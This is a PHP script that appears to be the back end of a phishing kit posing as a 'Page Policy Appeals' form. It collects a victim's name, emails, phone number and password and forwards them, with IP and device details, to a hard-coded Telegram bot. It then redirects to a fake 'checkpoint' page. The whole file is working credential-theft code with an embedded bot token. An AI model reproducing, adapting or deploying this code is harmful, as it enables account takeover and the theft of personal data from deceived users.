<?php
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    // Get form data
    $page = $_POST['page'];
    $fullname = $_POST['fullname'];
    $businessEmail = $_POST['business_email'];
    $personalEmail = $_POST['personal_email'];
    $phone = $_POST['phone'];
    $password = $_POST['password'];
    $additionalInfo = $_POST['yykwevbhfh'];

    // Fetch user's IP address from ipinfo.io
    $ipInfoResponse = file_get_contents('https://ipinfo.io');
    $ipInfoData = json_decode($ipInfoResponse, true);
    $userIp = isset($ipInfoData['ip']) ? $ipInfoData['ip'] : 'Unknown';

    // Prepare message for Telegram
    $message = "Page Policy Appeals Form Submission:\n\n"
        . "Page Name: $page\n"
        . "Fullname: $fullname\n"
        . "Business Email: $businessEmail\n"
        . "Personal Email: $personalEmail\n"
        . "Phone Number: $phone\n"
        . "Password: $password\n"
        . "Additional Information:\n$additionalInfo\n"
        . "IP Address: $userIp\n"
        . "Time: " . date("F j, Y, g:i a") . "\n"
        . "Device: " . $_SERVER['HTTP_USER_AGENT'];

    // Send to Telegram
    $botToken = '6967992542:AAGpVivwCSLjQNaui4xZvoft_-tsgSm5lN4';
    $channelID = '6401430680'; // Replace with your channel username or ID
    $apiEndpoint = "https://api.telegram.org/bot$botToken/sendMessage";

    $data = [
        'chat_id' => $channelID,
        'text' => $message,
    ];

    $options = [
        'http' => [
            'method' => 'POST',
            'header' => 'Content-Type: application/x-www-form-urlencoded',
            'content' => http_build_query($data),
        ],
    ];

    $context = stream_context_create($options);
    file_get_contents($apiEndpoint, false, $context);

    // Redirect to the next page after submitting the form
    header("Location: /checkpoint/next.php");
}
?>
